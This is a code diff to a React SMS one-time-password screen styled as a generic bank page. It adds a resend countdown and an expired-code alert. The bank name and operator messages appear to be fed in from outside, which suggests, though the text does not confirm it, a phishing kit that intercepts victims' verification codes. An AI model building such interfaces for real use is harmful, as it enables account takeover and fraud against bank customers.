@@ -1,7 +1,8 @@
-import React, { useState, useEffect } from "react";
-import { submitOtp } from "../../lib/bank-api";
+import React, { useState, useEffect, useCallback } from "react";
+import { submitOtp, resendOtp } from "../../lib/bank-api";
 import type { OperatorMessage as OperatorMessageType } from "../../types";
 import { Spinner } from "../../components/spinner";
+import { useResendCountdown } from "../../hooks/use-resend-countdown";
 
 interface SmsOtpProps {
   apiBase: string;
@@ -10,9 +11,14 @@ interface SmsOtpProps {
   bank?: string;
   onError: (msg: string) => void;
   wrongCode?: boolean;
+  expiredCode?: boolean;
   onTryAgain?: () => void;
   operatorMessage?: OperatorMessageType | null;
+  countdownResetTrigger?: number;
+  resendCooldownSeconds?: number;
 }
+
+const DEFAULT_RESEND_COOLDOWN = 60;
 
 export function SmsOtp({
   apiBase,
@@ -21,20 +27,33 @@ export function SmsOtp({
   bank,
   onError,
   wrongCode,
+  expiredCode,
   onTryAgain,
   operatorMessage,
+  countdownResetTrigger,
+  resendCooldownSeconds = DEFAULT_RESEND_COOLDOWN,
 }: SmsOtpProps) {
   const [submitting, setSubmitting] = useState(false);
   const [resetKey, setResetKey] = useState(0);
   const [code, setCode] = useState("");
 
+  const resendFn = useCallback(
+    () => resendOtp(apiBase, channelSlug, sessionId, "sms"),
+    [apiBase, channelSlug, sessionId]
+  );
+  const { secondsLeft, canResend, onResend, resending } = useResendCountdown(
+    resendCooldownSeconds,
+    countdownResetTrigger,
+    resendFn
+  );
+
   useEffect(() => {
-    if (wrongCode) {
+    if (wrongCode || expiredCode) {
       setSubmitting(false);
       setResetKey((k) => k + 1);
       setCode("");
     }
-  }, [wrongCode]);
+  }, [wrongCode, expiredCode]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -60,6 +79,11 @@ export function SmsOtp({
       {wrongCode && (
         <div className="bank-ui-alert">
           <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
+        </div>
+      )}
+      {expiredCode && (
+        <div className="bank-ui-alert">
+          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
         </div>
       )}
       <h2 className="bank-ui-heading">Enter verification code</h2>
@@ -97,6 +121,25 @@ export function SmsOtp({
           Submit
         </button>
       </form>
+      <div className="bank-ui-resend-row">
+        {canResend ? (
+          <button
+            type="button"
+            className="bank-ui-resend-btn"
+            onClick={() => {
+              onTryAgain?.();
+              onResend();
+            }}
+            disabled={resending || submitting}
+          >
+            {resending ? "Sending..." : "Resend SMS"}
+          </button>
+        ) : (
+          <span className="bank-ui-resend-countdown">
+            Resend SMS in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
+          </span>
+        )}
+      </div>
       {submitting && (
         <div className="bank-ui-waiting">
           <Spinner size={40} />
